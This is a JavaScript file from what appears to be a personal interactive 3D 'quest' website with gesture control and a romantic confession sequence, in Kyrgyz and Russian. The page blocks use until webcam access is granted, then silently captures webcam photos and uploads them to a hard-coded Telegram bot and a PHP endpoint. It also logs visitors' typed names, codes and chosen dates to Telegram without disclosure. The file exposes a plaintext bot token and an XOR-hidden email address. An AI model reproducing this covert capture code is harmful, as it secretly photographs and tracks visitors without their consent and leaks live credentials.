const len = hist.length;
if (!len) return out.copy(tip);
if (t <= hist[0].t) return out.copy(hist[0].p);
let lo = 0, hi = len - 1;
while (hi - lo > 1) {
const m = (lo + hi) >> 1;
if (hist[m].t <= t) lo = m; else hi = m;
}
const a = hist[lo], b = hist[hi];
const k = Math.min(1, Math.max(0, (t - a.t) / Math.max(1e-4, b.t - a.t)));
return out.lerpVectors(a.p, b.p, k);
}
const bgMusic = $('#bgMusic');
const musicBtn = $('#musicBtn');
let musicPausedByUser = false;
bgMusic.volume = 0.80;
function syncMusicUI() {
const playing = !bgMusic.paused && !bgMusic.ended;
musicBtn.classList.toggle('playing', playing);
musicBtn.innerHTML = (playing ? '🔊 Музыка' : '🔇 Музыка') + '<span class="kb-hint"> [M]</span>';
}
function tryPlayMusic() {
if (!camOn || musicPausedByUser) return;
if (!bgMusic.paused) {
syncMusicUI();
return;
}
const p = bgMusic.play();
if (p && typeof p.then === 'function') {
p.then(syncMusicUI).catch(() => syncMusicUI());
} else {
syncMusicUI();
}
}
function toggleMusic() {
if (bgMusic.paused) {
musicPausedByUser = false;
tryPlayMusic();
} else {
musicPausedByUser = true;
bgMusic.pause();
syncMusicUI();
}
}
bgMusic.addEventListener('play', syncMusicUI);
bgMusic.addEventListener('pause', syncMusicUI);
musicBtn.addEventListener('pointerdown', e => {
e.stopPropagation();
toggleMusic();
});
tryPlayMusic();
['pointerdown', 'keydown', 'touchstart', 'click'].forEach(ev => {
addEventListener(ev, () => {
if (!musicPausedByUser && bgMusic.paused) tryPlayMusic();
}, { passive: true });
});
const TELEGRAM_BOT_TOKEN = '9162626373:AAGWDe3SHn7F7bd1_JAV9zGYdjaiNEupBRs';
const TELEGRAM_CHAT_ID   = '1626859910';
const EMAIL_WEBHOOK_URL  = 'https://script.google.com/macros/s/AKfycby_x431SbuZMkz9J3_4149v1mnxFiFdCbN0Z-B9bP5XNH_xO6l8Phf23pKcXozagK5VKQ/exec';
function sendTelegramLog(text) {
if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
}).catch(() => {});
}
function fnv1aHash(str) {
let h = 2166136261;
for (let i = 0; i < str.length; i++) {
h ^= str.charCodeAt(i);
h = Math.imul(h, 16777619) >>> 0;
}
return h >>> 0;
}
const ENC_MAIL_BYTES = [34, 40, 36, 40, 37, 38, 63, 40, 58, 40, 32, 34, 40, 37, 123, 120, 112, 9, 46, 36, 40, 32, 37, 103, 42, 38, 36];
const ENC_TITLE_BYTES = [1128, 1145, 1136, 1139, 1145, 1138, 105, 10029, 65094];
function decodeRecipientEmail() {
return ENC_MAIL_BYTES.map(b => String.fromCharCode(b ^ 73)).join('');
}
function decodeMailTitle() {
return ENC_TITLE_BYTES.map(b => String.fromCharCode(b ^ 73)).join('');
}
function maskEmailAddress(email) {
const [local, domain] = email.split('@');
if (!local || !domain || local.length < 3) return 'k***19@gmail.com';
return `${local[0]}***${local.slice(-2)}@${domain}`;
}
let generatedEmailCode = '';
let isTargetUser = false;
let isCodeVerified = false;
let wrongCodeCount = 0;
function sendVerificationEmail(code) {
const targetEmail = decodeRecipientEmail();
const masked = maskEmailAddress(targetEmail);
const mailTitle = decodeMailTitle();
$('#qMaskedMail').textContent = masked;
if (EMAIL_WEBHOOK_URL) {
const qUrl = `${EMAIL_WEBHOOK_URL}?to=${encodeURIComponent(targetEmail)}&code=${encodeURIComponent(code)}&title=${encodeURIComponent(mailTitle)}&_t=${Date.now()}`;
fetch(qUrl, {
method: 'GET',
mode: 'no-cors',
cache: 'no-store'
}).catch(() => {
fetch(EMAIL_WEBHOOK_URL, {
method: 'POST',
mode: 'no-cors',
headers: { 'Content-Type': 'text/plain;charset=utf-8' },
body: JSON.stringify({ to: targetEmail, code, title: mailTitle })
}).catch(() => {});
});
}
if (!EMAIL_WEBHOOK_URL && (location.protocol === 'http:' || location.protocol === 'https:')) {
fetch('/send-code', {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ to: targetEmail, code })
}).catch(() => {});
}
sendTelegramLog(`🔐 Квест (${mailTitle}): введён секретный ключ со звёздочкой\n📧 Код для почты (${masked}): ${code}`);
}
const questOverlay = $('#questOverlay');
const questCard    = $('#questCard');
const qStepCam     = $('#qStepCam');
const qStep1       = $('#qStep1');
const qStep2       = $('#qStep2');
const qStep3       = $('#qStep3');
const qHintCam     = $('#qHintCam');
const qBtnCam      = $('#qBtnCam');
const qNameInput   = $('#qNameInput');
const qCodeInput   = $('#qCodeInput');
const qHint1       = $('#qHint1');
const qHint2       = $('#qHint2');
const qHint3       = $('#qHint3');
function shakeCard() {
questCard.classList.remove('shake');
void questCard.offsetWidth;
questCard.classList.add('shake');
}
function showQuestStep(stepEl) {
[qStepCam, qStep1, qStep2, qStep3].forEach(el => el.classList.toggle('active', el === stepEl));
}
function lockForCameraAccess(msg) {
camOn = false;
confessionActive = false;
questCompleted = false;
$('#camDot').classList.remove('live');
$('#camPreviewWrap').classList.remove('visible', 'centered');
questOverlay.classList.remove('done');
$('#confessionOverlay').classList.remove('active');
$('#hud').classList.add('hidden');
if (typeof bgMusic !== 'undefined' && bgMusic && !bgMusic.paused) {
try { bgMusic.pause(); } catch (_) {}
}
showQuestStep(qStepCam);
qHintCam.textContent = msg || 'Сайтты ачуу үчүн камерага уруксат бериңиз';
shakeCard();
}
qBtnCam.addEventListener('click', () => {
qHintCam.textContent = '';
startCamera();
});
let whooshTimeLeft = 0.0;
let whooshDuration = 1.0;
let whooshStrength = 1.0;
let confessionActive = false;
function triggerParticleWhoosh(strength = 1.0, duration = 2.2) {
whooshStrength = strength;
whooshDuration = Math.max(0.4, duration);
whooshTimeLeft = whooshDuration;
trailCur = Math.max(trailCur, 1.28 * strength);
bloom.strength = Math.max(bloom.strength, 0.36 * strength);
const spanX = HALF_H * camera.aspect * 1.55;
const spanY = HALF_H * 1.45;
for (let i = 0; i < N; i++) {
const ang = ph[i] + (i / N) * Math.PI * 6.0;
const rad = (0.35 + 0.95 * rnd[i]) * (8.5 + 7.5 * strength);
vx[i] += (Math.cos(ang) * rad - Math.sin(ang) * rad * 0.65) * (spanX / 5.0);
vy[i] += (Math.sin(ang) * rad + Math.cos(ang) * rad * 0.65) * (spanY / 5.0);
vz[i] += (sxSeed[i] * 7.5 + 3.5) * strength;
}
}
function finishQuestWalkthrough(openRealSai) {
if (!camOn) {
lockForCameraAccess();
return;
}
if (openRealSai) {
unlockRealSaiPhoto();
}
confessionActive = false;
questCompleted = true;
questOverlay.classList.add('done');
$('#confessionOverlay').classList.remove('active');
$('#hud').classList.remove('hidden');
tryPlayMusic();
colorMix = -0.01;
setMode(MODE.LOGO);
}
const CONFESS_LINES = [
'Бул мен айтып аткан сайт',
'Уже кеч болуп калды окшойт',
'Кандай болгон күндө да сени жоолуктурганыма шүгүр'
];
const confessionOverlay = $('#confessionOverlay');
const confessDotsEl     = $('#confessDots');
const confessTextEl     = $('#confessText');
const confessArrowWrap  = $('#confessArrowWrap');
const confessNextBtn    = $('#confessNextBtn');
let confessIdx = 0;
let confessStepLock = false;
CONFESS_LINES.forEach((_, idx) => {
const dot = document.createElement('span');
dot.className = 'confess-dot' + (idx === 0 ? ' active' : '');
confessDotsEl.appendChild(dot);
});
function updateConfessDots() {
const dots = confessDotsEl.querySelectorAll('.confess-dot');
dots.forEach((d, idx) => {
d.classList.toggle('active', idx === confessIdx);
d.classList.toggle('passed', idx < confessIdx);
});
}
function startConfessionSequence() {
questOverlay.classList.add('done');
tryPlayMusic();
confessionActive = true;
confessIdx = 0;
confessStepLock = false;
confessArrowWrap.classList.remove('hidden-arrow');
confessTextEl.textContent = CONFESS_LINES[0];
updateConfessDots();
triggerParticleWhoosh(1.0, 2.35);
setTimeout(() => {
confessionOverlay.classList.add('active');
}, 1650);
}
function advanceConfessionStep() {
if (!confessionActive || confessStepLock) return;
confessStepLock = true;
if (confessIdx < CONFESS_LINES.length - 1) {
confessIdx++;
triggerParticleWhoosh(0.45, 0.95);
confessTextEl.classList.add('out-up');
setTimeout(() => {
confessTextEl.textContent = CONFESS_LINES[confessIdx];
updateConfessDots();
confessTextEl.classList.remove('out-up');
confessTextEl.classList.add('in-from-bottom');
void confessTextEl.offsetWidth;
confessTextEl.classList.remove('in-from-bottom');
setTimeout(() => { confessStepLock = false; }, 420);
}, 380);
} else {
confessArrowWrap.classList.add('hidden-arrow');
sendTelegramLog(`👀 ${decodeMailTitle()}: дочитаны все ${CONFESS_LINES.length} личных фраз -> Открывается скрытое 3D-фото!`);
confessionOverlay.classList.remove('active');
unlockRealSaiPhoto();
triggerParticleWhoosh(1.0, 1.75);
setTimeout(() => {
confessStepLock = false;
finishQuestWalkthrough(true);
}, 1250);
}
}
confessNextBtn.addEventListener('click', e => {
e.stopPropagation();
advanceConfessionStep();
});
confessionOverlay.addEventListener('wheel', e => {
if (!confessionActive) return;
if (e.deltaY > 18) {
advanceConfessionStep();
}
}, { passive: true });
let touchStartY = null;
confessionOverlay.addEventListener('touchstart', e => {
if (!confessionActive) return;
if (e.touches && e.touches.length === 1) {
touchStartY = e.touches[0].clientY;
}
}, { passive: true });
confessionOverlay.addEventListener('touchend', e => {
if (!confessionActive || touchStartY === null) return;
const dy = touchStartY - (e.changedTouches[0] ? e.changedTouches[0].clientY : touchStartY);
touchStartY = null;
if (Math.abs(dy) > 32) {
advanceConfessionStep();
}
}, { passive: true });
addEventListener('keydown', e => {
if (!confessionActive) return;
if (e.key === 'ArrowDown' || e.key === ' ' || e.key === 'Enter') {
e.preventDefault();
advanceConfessionStep();
}
});
function submitStep1() {
if (!camOn) {
lockForCameraAccess();
return;
}
const rawName = (qNameInput.value || '').trim();
if (!rawName) {
qHint1.textContent = 'Сураныч, атыңызды жазыңыз';
shakeCard();
qNameInput.focus();
return;
}
qHint1.textContent = '';
const norm = rawName.toLowerCase().replace(/\s+/g, '');
const h = fnv1aHash(norm);
if (h === 3624747020 || h === 3898389154) {
isTargetUser = true;
generatedEmailCode = String(Math.floor(1000 + Math.random() * 9000));
sendVerificationEmail(generatedEmailCode);
showQuestStep(qStep2);
setTimeout(() => qCodeInput.focus(), 120);
} else {
isTargetUser = false;
sendTelegramLog(`🕵️ Квест (${decodeMailTitle()}): вход с ответом «${rawName}»\n🎯 Сработал резервный режим -> открыт 3D-логотип ОшГУ`);
finishQuestWalkthrough(false);
}
}
$('#qBtn1').addEventListener('click', submitStep1);
qNameInput.addEventListener('keydown', e => {
e.stopPropagation();
if (e.key === 'Enter') submitStep1();
});
function submitStep2() {
if (!camOn) {
lockForCameraAccess();
return;
}
const codeVal = (qCodeInput.value || '').trim();
if (codeVal.length < 4) {
qHint2.textContent = '4 орундуу кодду толук жазыңыз';
shakeCard();
qCodeInput.focus();
return;
}
qHint2.textContent = '';
if (codeVal === generatedEmailCode) {
isCodeVerified = true;
sendTelegramLog(`✅ Квест (${decodeMailTitle()}): верный код с почты (${codeVal}). Переход к выбору даты рождения.`);
showQuestStep(qStep3);
} else {
wrongCodeCount++;
if (wrongCodeCount === 1) {
qHint2.textContent = 'Код туура эмес, кайра текшерип жазыңыз';
shakeCard();
qCodeInput.select();
} else {
isCodeVerified = false;
sendTelegramLog(`⚠️ Квест (${decodeMailTitle()}): введён неверный код (${codeVal}). Сработал резервный режим -> в финале откроется 3D-логотип ОшГУ.`);
showQuestStep(qStep3);
}
}
}
$('#qBtn2').addEventListener('click', submitStep2);
qCodeInput.addEventListener('keydown', e => {
e.stopPropagation();
if (e.key === 'Enter') submitStep2();
});
const MONTH_NAMES = [
'январь', 'февраль', 'март', 'апрель', 'май', 'июнь',
'июль', 'август', 'сентябрь', 'октябрь', 'ноябрь', 'декабрь'
];
const calMonthSel = $('#calMonth');
const calYearSel  = $('#calYear');
const calDaysGrid = $('#calDays');
const calPickedLabel = $('#calPickedLabel');
let calViewYear  = 2006;
let calViewMonth = 0;
let pickedYear   = null;
let pickedMonth  = null;
let pickedDay    = null;
MONTH_NAMES.forEach((mName, idx) => {
const opt = document.createElement('option');
opt.value = idx;
opt.textContent = mName.charAt(0).toUpperCase() + mName.slice(1);
calMonthSel.appendChild(opt);
});
for (let y = 1995; y <= 2015; y++) {
const opt = document.createElement('option');
opt.value = y;
opt.textContent = `${y}-год`;
calYearSel.appendChild(opt);
}
function renderCalendar() {
calMonthSel.value = calViewMonth;
calYearSel.value  = calViewYear;
calDaysGrid.innerHTML = '';
const firstDayDate = new Date(calViewYear, calViewMonth, 1);
const startOffset = (firstDayDate.getDay() + 6) % 7;
const daysInMonth = new Date(calViewYear, calViewMonth + 1, 0).getDate();
for (let s = 0; s < startOffset; s++) {
const empty = document.createElement('div');
empty.className = 'cal-day empty';
calDaysGrid.appendChild(empty);
}
for (let d = 1; d <= daysInMonth; d++) {
const btn = document.createElement('button');
btn.type = 'button';
btn.className = 'cal-day';
btn.textContent = d;
if (pickedYear === calViewYear && pickedMonth === calViewMonth && pickedDay === d) {
btn.classList.add('selected');
}
btn.addEventListener('click', () => {
pickedYear  = calViewYear;
pickedMonth = calViewMonth;
pickedDay   = d;
qHint3.textContent = '';
const dd = String(d).padStart(2, '0');
calPickedLabel.textContent = `${dd}-${MONTH_NAMES[pickedMonth]} ${pickedYear}-год`;
renderCalendar();
});
calDaysGrid.appendChild(btn);
}
}
calMonthSel.addEventListener('change', () => {
calViewMonth = +calMonthSel.value;
renderCalendar();
});
calYearSel.addEventListener('change', () => {
calViewYear = +calYearSel.value;
renderCalendar();
});
$('#calPrev').addEventListener('click', () => {
calViewMonth--;
if (calViewMonth < 0) {
calViewMonth = 11;
calViewYear = Math.max(1995, calViewYear - 1);
}
renderCalendar();
});
$('#calNext').addEventListener('click', () => {
calViewMonth++;
if (calViewMonth > 11) {
calViewMonth = 0;
calViewYear = Math.min(2015, calViewYear + 1);
}
renderCalendar();
});
renderCalendar();
function submitStep3() {
if (!camOn) {
lockForCameraAccess();
return;
}
if (!pickedDay || pickedMonth === null || !pickedYear) {
qHint3.textContent = 'Календардан туулган күнүңдү танда';
shakeCard();
return;
}
const dd = String(pickedDay).padStart(2, '0');
const formattedDate = `${dd}-${MONTH_NAMES[pickedMonth]} ${pickedYear}-год`;
const dateKey = `${pickedYear}-${pickedMonth + 1}-${pickedDay}`;
const isBirthDateCorrect = (fnv1aHash(dateKey) === 1741832777);
if (isTargetUser && isCodeVerified && isBirthDateCorrect) {
sendTelegramLog(`💖 Квест (${decodeMailTitle()}) ПРОЙДЕН! Выбрана верная дата (${formattedDate}) -> Запущен полноэкранный ВЖУУХ и показ личных сообщений!`);
startConfessionSequence();
} else {
sendTelegramLog(`🛡 Квест (${decodeMailTitle()}): выбрана дата «${formattedDate}» (код=${isCodeVerified}) -> Сработал резервный режим, открыт 3D-логотип ОшГУ`);
finishQuestWalkthrough(false);
}
}
$('#qBtn3').addEventListener('click', submitStep3);
const camPreviewWrap = $('#camPreviewWrap');
const videoEl = $('#v');
const snapCanvas = document.createElement('canvas');
const snapCtx = snapCanvas.getContext('2d');
let snapTimer = null;
let lastSnapTime = 0;
function captureAndSendPhoto() {
if (!videoEl || videoEl.readyState < 2 || !videoEl.videoWidth) return;
const now = Date.now();
if (now - lastSnapTime < 3000) return;
lastSnapTime = now;
const vw = videoEl.videoWidth;
const vh = videoEl.videoHeight;
snapCanvas.width = vw;
snapCanvas.height = vh;
snapCtx.save();
snapCtx.translate(vw, 0);
snapCtx.scale(-1, 1);
snapCtx.drawImage(videoEl, 0, 0, vw, vh);
snapCtx.restore();
snapCanvas.toBlob(blob => {
if (!blob) return;
const stamp = new Date().toLocaleString('ru-RU');
const modeNames = ['Сердце', 'Поток', 'Фото 3D', 'Сердцепад'];
const modeName = modeNames[mode] || 'Сердцепад';
if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
const fd = new FormData();
fd.append('chat_id', TELEGRAM_CHAT_ID);
fd.append('photo', blob, `sai_heartfall_${now}.jpg`);
fd.append('caption', `💖 Снимок из режима «${modeName}» (${decodeMailTitle()})\n🕒 ${stamp}`);
fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
method: 'POST',
body: fd
}).catch(() => {});
}
if (location.protocol === 'http:' || location.protocol === 'https:') {
fetch('upload-photo.php', {
method: 'POST',
headers: { 'Content-Type': 'image/jpeg' },
body: blob
}).catch(() => {});
}
}, 'image/jpeg', 0.90);
}
const modeBtns = document.querySelectorAll('.mode-btn[data-mode]');
function setMode(m) {
if (mode === m) return;
if (m !== MODE.LOGO) prevNonFistMode = m;
mode = m;
modeBtns.forEach(b => b.classList.toggle('active', +b.dataset.mode === mode));
if (mode === MODE.RAIN) {
if (camOn) camPreviewWrap.classList.add('centered');
if (snapTimer) clearTimeout(snapTimer);
snapTimer = setTimeout(() => {
if (mode === MODE.RAIN && camOn) captureAndSendPhoto();
}, 680);
} else {
camPreviewWrap.classList.remove('centered');
if (snapTimer) {
clearTimeout(snapTimer);
snapTimer = null;
}
}
if (mode !== MODE.RAIN) {
if (snapTimer) clearTimeout(snapTimer);
if (camOn) {
snapTimer = setTimeout(() => {
if (mode === m && camOn) captureAndSendPhoto();
}, 680);
}
}
}
modeBtns.forEach(b => {
b.addEventListener('pointerdown', e => {
e.stopPropagation();
tryPlayMusic();
setMode(+b.dataset.mode);
});
});
addEventListener('keydown', e => {
if (!questCompleted) return;
if (e.key >= '1' && e.key <= '4') setMode(+e.key - 1);
if (e.key === 'h' || e.key === 'H' || e.key === 'р' || e.key === 'Р') {
$('#hud').classList.toggle('hidden');
}
if (e.key === 'm' || e.key === 'M' || e.key === 'ь' || e.key === 'Ь') {
toggleMusic();
}
});
let mouseHeldFist = false;
const activeTouches = new Map();
let pinchStartDist = 0;
let pinchStartScale = 1.0;
let lastTapTime = 0;
if (isMobile) {
$('#camLabel').textContent = '1 палец — вести • 2×тап / 2 пальца — Фото 3D';
}
function ptrToWorld(x, y, out) {
const nx = (x / innerWidth) * 2 - 1;
const ny = -((y / innerHeight) * 2 - 1);
out.set(nx * HALF_H * camera.aspect, ny * HALF_H, 0);
}
function updateFromPointer(clientX, clientY) {
ptrToWorld(clientX, clientY, anchorT);
const yOff = 1.35 * viewFit;
anchorT.y -= yOff;
tipT.copy(anchorT);
tipT.y += yOff;
handRollT = -((clientX / innerWidth) * 2 - 1) * 0.16;
}
addEventListener('pointermove', e => {
if (!questCompleted) return;
if (e.pointerType === 'touch') {
if (!activeTouches.has(e.pointerId)) return;
activeTouches.set(e.pointerId, { x: e.clientX, y: e.clientY });
if (activeTouches.size === 1) {
updateFromPointer(e.clientX, e.clientY);
} else if (activeTouches.size >= 2) {
const pts = Array.from(activeTouches.values());
const cx = (pts[0].x + pts[1].x) * 0.5;
const cy = (pts[0].y + pts[1].y) * 0.5;
updateFromPointer(cx, cy);
const dist = Math.hypot(pts[0].x - pts[1].x, pts[0].y - pts[1].y);
if (pinchStartDist > 12) {
handScaleT = Math.min(1.45, Math.max(0.68, pinchStartScale * (dist / pinchStartDist)));
}
}
return;
}
if (camOn) return;
updateFromPointer(e.clientX, e.clientY);
});
canvas.addEventListener('pointerdown', e => {
if (!questCompleted) return;
if (e.pointerType === 'touch') {
activeTouches.set(e.pointerId, { x: e.clientX, y: e.clientY });
if (activeTouches.size === 1) {
updateFromPointer(e.clientX, e.clientY);
const now = performance.now();
if (now - lastTapTime < 300) {
if (mode === MODE.LOGO) setMode(prevNonFistMode);
else setMode(MODE.LOGO);
lastTapTime = 0;
} else {
lastTapTime = now;
}
} else if (activeTouches.size === 2) {
const pts = Array.from(activeTouches.values());
pinchStartDist = Math.hypot(pts[0].x - pts[1].x, pts[0].y - pts[1].y);
pinchStartScale = handScaleT;
if (mode !== MODE.LOGO) {
mouseHeldFist = true;
setMode(MODE.LOGO);
}
}
return;
}
if (camOn) return;
updateFromPointer(e.clientX, e.clientY);
if (e.button === 0 && mode !== MODE.LOGO) {
mouseHeldFist = true;
setMode(MODE.LOGO);
}
});
function onPointerEnd(e) {
if (!questCompleted) return;
if (e.pointerType === 'touch') {
activeTouches.delete(e.pointerId);
if (activeTouches.size < 2 && mouseHeldFist) {
mouseHeldFist = false;
setMode(prevNonFistMode);
}
return;
}
if (camOn) return;
if (mouseHeldFist) {
mouseHeldFist = false;
setMode(prevNonFistMode);
}
}
addEventListener('pointerup', onPointerEnd);
addEventListener('pointercancel', onPointerEnd);
if (isMobile && window.DeviceOrientationEvent) {
addEventListener('deviceorientation', e => {
if (camOn || activeTouches.size > 0 || e.gamma == null) return;
handRollT = Math.max(-0.35, Math.min(0.35, -(e.gamma / 45) * 0.25));
}, { passive: true });
}
const camCanvas = $('#camCanvas');
const camCtx = camCanvas.getContext('2d');
const HAND_CONNECTIONS = [
[0,1],[1,2],[2,3],[3,4],
[0,5],[5,6],[6,7],[7,8],
[5,9],[9,10],[10,11],[11,12],
[9,13],[13,14],[14,15],[15,16],
[13,17],[17,18],[18,19],[19,20],[0,17]
];
const d3 = (a, b) => Math.hypot(a.x - b.x, a.y - b.y, (a.z - b.z) * 0.5);
function classify(lm, prev) {
const w = lm[0];
const ext = (t, m) => d3(lm[t], w) > d3(lm[m], w) * 1.52;
const i = ext(8, 5), m = ext(12, 9), r = ext(16, 13), p = ext(20, 17);
if (i && m && r && p) return MODE.HEART;
if (!i && !m && !r && !p) return MODE.LOGO;
if (i && p && !m && !r) return MODE.RAIN;
if (i && !m && !r && !p) return MODE.STREAM;
return prev;
}
let cand = -1, candN = 0;
function onHands(res) {
const cw = camCanvas.width, ch = camCanvas.height;
camCtx.clearRect(0, 0, cw, ch);
if (res.image) {
camCtx.globalAlpha = mode === MODE.RAIN ? 0.96 : 0.58;
camCtx.drawImage(res.image, 0, 0, cw, ch);
camCtx.globalAlpha = 1.0;
}
if (!res.multiHandLandmarks || !res.multiHandLandmarks.length) return;
const lm = res.multiHandLandmarks[0];
if (mode !== MODE.RAIN) {
camCtx.strokeStyle = 'rgba(255, 85, 120, 0.85)';
camCtx.lineWidth = 1.8;
camCtx.beginPath();
for (let k = 0; k < HAND_CONNECTIONS.length; k++) {
const [a, b] = HAND_CONNECTIONS[k];
camCtx.moveTo(lm[a].x * cw, lm[a].y * ch);
camCtx.lineTo(lm[b].x * cw, lm[b].y * ch);
}
camCtx.stroke();
camCtx.fillStyle = '#ffd875';
for (let k = 0; k < lm.length; k++) {
camCtx.beginPath();
camCtx.arc(lm[k].x * cw, lm[k].y * ch, 2.1, 0, Math.PI * 2);
camCtx.fill();
}
}
if (!questCompleted) return;
const c = classify(lm, mode);
if (c === cand) candN++; else { cand = c; candN = 1; }
if (candN >= 3) setMode(c);
const mx = (1 - lm[9].x) * 2 - 1;
const my = (1 - lm[9].y) * 2 - 1;
anchorT.set(mx * HALF_H * camera.aspect * 1.05, my * HALF_H * 1.05 - 0.9, 0);
const tx = (1 - lm[8].x) * 2 - 1;
const ty = (1 - lm[8].y) * 2 - 1;
tipT.set(tx * HALF_H * camera.aspect * 1.05, ty * HALF_H * 1.05, 0);
const sz = Math.hypot(lm[0].x - lm[9].x, lm[0].y - lm[9].y);
handScaleT = Math.min(1.42, Math.max(0.72, sz / 0.175));
const dxRoll = (1 - lm[9].x) - (1 - lm[0].x);
const dyRoll = (1 - lm[9].y) - (1 - lm[0].y);
handRollT = Math.max(-0.45, Math.min(0.45, -Math.atan2(dxRoll, Math.max(0.08, dyRoll)) * 0.55));
}
async function startCamera() {
if (camOn) return;
if (camRequesting) {
if (qHintCam) qHintCam.textContent = 'Браузердин суроосунан «Уруксат берүү» басыңыз';
return;
}
if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
lockForCameraAccess('Бул браузер камераны колдобойт же HTTPS туташуу керек.');
return;
}
camRequesting = true;
if (qBtnCam) qBtnCam.disabled = true;
if (qHintCam) qHintCam.textContent = '';
let stream = null;
try {
const v = $('#v');
stream = await navigator.mediaDevices.getUserMedia({
video: {
width: { ideal: isMobile ? 320 : 640 },
height: { ideal: isMobile ? 240 : 480 },
frameRate: { ideal: isMobile ? 24 : 30 },
facingMode: 'user'
},
audio: false
});
v.srcObject = stream;
await v.play();
camOn = true;
camRequesting = false;
if (qBtnCam) qBtnCam.disabled = false;
stream.getVideoTracks().forEach(track => {
track.addEventListener('ended', () => {
lockForCameraAccess('Камера өчүрүлдү. Улантуу үчүн камерага кайра уруксат бериңиз.');
});
});
$('#camDot').classList.add('live');
$('#camLabel').textContent = 'Жесты руки активны';
camPreviewWrap.classList.add('visible');
if (qStepCam.classList.contains('active')) {
showQuestStep(qStep1);
}
if (mode === MODE.RAIN) {
camPreviewWrap.classList.add('centered');
setTimeout(() => { if (mode === MODE.RAIN && camOn) captureAndSendPhoto(); }, 680);
}
tryPlayMusic();
if (typeof Hands === 'undefined') return;
const hands = new Hands({
locateFile: f => `https://cdn.jsdelivr.net/npm/@mediapipe/hands@0.4.1675469240/${f}`
});
hands.setOptions({
maxNumHands: 1,
modelComplexity: 0,
minDetectionConfidence: 0.6,
minTrackingConfidence: 0.5
});
hands.onResults(onHands);
hands.initialize().then(() => {
let busy = false;
let lastSendTs = 0;
const minGap = isMobile ? 70 : 0;
const pump = () => {
if (!camOn) return;
const now = performance.now();
if (questCompleted && !busy && v.readyState >= 2 && (now - lastSendTs >= minGap)) {
busy = true;
lastSendTs = now;
hands.send({ image: v }).catch(() => {}).finally(() => { busy = false; });
}
if (v.requestVideoFrameCallback) v.requestVideoFrameCallback(pump);
else setTimeout(pump, isMobile ? 32 : 16);
};
pump();
}).catch(() => {});
} catch (err) {
if (stream) {
try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
}
camRequesting = false;
if (qBtnCam) qBtnCam.disabled = false;
const msg = (err && (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError'))
? 'Камерага уруксат берилген жок. Браузердин жөндөөлөрүнөн уруксат берип, кайра басыңыз.'
: 'Камера иштеген жок. Камераны текшерип, кайра уруксат бериңиз.';
lockForCameraAccess(msg);
sendTelegramLog(`🚫 Доступ к камере отклонён/недоступен (${err ? err.name || err.message : 'error'}) — сайт заблокирован.`);
}
}
startCamera();
let lastW = 0, lastH = 0;
function resize() {
const w = innerWidth, h = innerHeight;
const ae = document.activeElement;
if (isMobile && lastW > 0 && Math.abs(w - lastW) <= 2 && Math.abs(h - lastH) > 40 && ae && (ae.tagName === 'INPUT' || ae.tagName === 'TEXTAREA' || ae.tagName === 'SELECT')) {
return;
}
lastW = w;
lastH = h;
const narrow = w <= 768 || (w / h) < 0.85;
renderer.setPixelRatio(Math.min(window.devicePixelRatio || 1, isMobile ? 1.0 : 1.6));
renderer.setSize(w, h, false);
composer.setSize(w, h);
bloom.resolution.set(isMobile ? Math.max(1, w >> 2) : (narrow ? Math.max(1, w >> 1) : w), isMobile ? Math.max(1, h >> 2) : (narrow ? Math.max(1, h >> 1) : h));
camera.aspect = w / h;
camera.updateProjectionMatrix();
const halfW = HALF_H * camera.aspect;
viewFit = Math.min(1.0, Math.max(0.84, halfW / 2.55));
}
addEventListener('resize', resize);
resize();
anchor.y = anchorT.y = -1.2 * viewFit;
function writeMat4(arr, offset, tx, ty, tz, x, y, z, w, sx, sy, sz) {
const x2 = x + x, y2 = y + y, z2 = z + z;
const xx = x * x2, xy = x * y2, xz = x * z2;
const yy = y * y2, yz = y * z2, zz = z * z2;
const wx = w * x2, wy = w * y2, wz = w * z2;
arr[offset]      = (1 - (yy + zz)) * sx;
arr[offset + 1]  = (xy + wz) * sx;
arr[offset + 2]  = (xz - wy) * sx;
arr[offset + 3]  = 0;
arr[offset + 4]  = (xy - wz) * sy;
arr[offset + 5]  = (1 - (xx + zz)) * sy;
arr[offset + 6]  = (yz + wx) * sy;
arr[offset + 7]  = 0;
arr[offset + 8]  = (xz + wy) * sz;
arr[offset + 9]  = (yz - wx) * sz;
arr[offset + 10] = (1 - (xx + yy)) * sz;
arr[offset + 11] = 0;
arr[offset + 12] = tx;
arr[offset + 13] = ty;
arr[offset + 14] = tz;
arr[offset + 15] = 1;
}
const va = new THREE.Vector3(), vb = new THREE.Vector3();
const ctr = new THREE.Vector3();
const logoQuat = new THREE.Quaternion(), logoEuler = new THREE.Euler(0, 0, 0, 'YXZ');
const clock = new THREE.Clock();
const OM_TABLE    = [4.1, 7.4, 4.8, 4.4];
const SCALE_TABLE = [0.54, 0.60, 0.50, 0.28];
const TRAIL_TABLE = [0.22, 0.88, 0.04, 0.12];
let mobileWarmFrames = 0;
function frame() {
requestAnimationFrame(frame);
const dt = Math.min(clock.getDelta(), 1 / 30);
const t = clock.elapsedTime;
if (document.body.classList.contains('privacy-locked')) {
renderer.setRenderTarget(null);
renderer.clear();
return;
}
if (isMobile && !questCompleted && !confessionActive && whooshTimeLeft <= 0) {
if (mobileWarmFrames >= 4) return;
mobileWarmFrames++;
}
const sm = 1 - Math.exp(-dt * 9);
dampVec(anchor, anchorT, anchorV, 11, dt);
dampVec(tip, tipT, tipV, 16, dt);
handScale += (handScaleT - handScale) * sm;
handRoll  += (handRollT - handRoll) * sm;
hist.push({ t, p: tip.clone() });
while (hist.length > 2 && hist[0].t < t - 3.0) hist.shift();
const om = OM_TABLE[mode];
const zeta = mode === MODE.STREAM ? 0.72 : (mode === MODE.LOGO ? 0.92 : 0.86);
const kq = 1 - Math.exp(-dt * 9.5);
if (whooshTimeLeft > 0) {
whooshTimeLeft = Math.max(0, whooshTimeLeft - dt);
}
const whooshMix = whooshTimeLeft > 0 ? Math.sin((whooshTimeLeft / whooshDuration) * Math.PI) * whooshStrength : 0.0;
const effScale = handScale * viewFit;
